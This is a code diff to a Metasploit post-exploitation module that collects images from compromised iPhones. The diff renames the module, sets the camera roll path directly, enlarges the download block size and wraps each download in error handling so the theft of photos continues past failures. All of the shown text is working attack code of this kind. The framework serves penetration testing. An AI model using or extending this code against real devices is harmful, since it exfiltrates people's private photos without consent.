@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
-      'Name'          =>  'iOS Image and Text Gatherer',
+      'Name'          =>  'iOS Image Gatherer',
       'Description'   =>  %q{
         This module collects images and text messages from iPhones.
       },
@@ -26,7 +26,6 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_img
-    img_path = '/private/var/mobile/Media/DCIM/100APPlE'
     path = File.join(Msf::Config.loot_directory, Rex::Text.rand_text_alpha(6))
     local_path = File.expand_path(path)
 
@@ -34,16 +33,20 @@ class MetasploitModule < Msf::Post
       print_bad('Default image path not found')
       return
     end
-
-    opts = { "block_size" => 4000 }
     print_good('Image path found. Will begin searching for images...')
-    cd('/private/var/mobile')
-    cd('Media/DCIM/100APPLE')
+
+    cd('/private/var/mobile/Media/DCIM/100APPLE')
     ios_imgs = dir(pwd)
     print_status("Directory for iOS images: #{local_path}")
+
+    opts = { "block_size" => 262144 }
     ios_imgs.each do |img|
-      print_status("Downloading image: #{img}")
-      client.fs.file.download_file("#{local_path}/#{img}", "#{pwd}/#{img}", opts)
+      begin
+        print_status("Downloading image: #{img}")
+        client.fs.file.download_file("#{local_path}/#{img}", "#{pwd}/#{img}", opts)
+      rescue
+        print_error("#{img} could not be downloaded")
+      end
     end
   end
 
